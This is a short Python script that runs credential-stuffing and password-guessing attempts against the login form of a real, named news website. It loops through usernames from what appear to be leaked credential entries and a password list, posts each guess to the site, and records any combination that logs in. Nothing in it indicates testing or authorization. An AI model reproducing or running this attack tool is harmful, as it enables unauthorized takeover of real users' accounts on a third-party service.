import requests
import time
from output import *

def attempt(entry, passwords):
	try:
		for item in [entry[1], entry[2]] + passwords:
			data = {"form_id": "user_login", "name": entry[1], "pass": item}
			response = requests.post("http://zerohedge.com/user/", data).text
			if "/user/password" not in response:
				output(entry + [item])
				exit()
	except Exception as error: time.sleep(1)
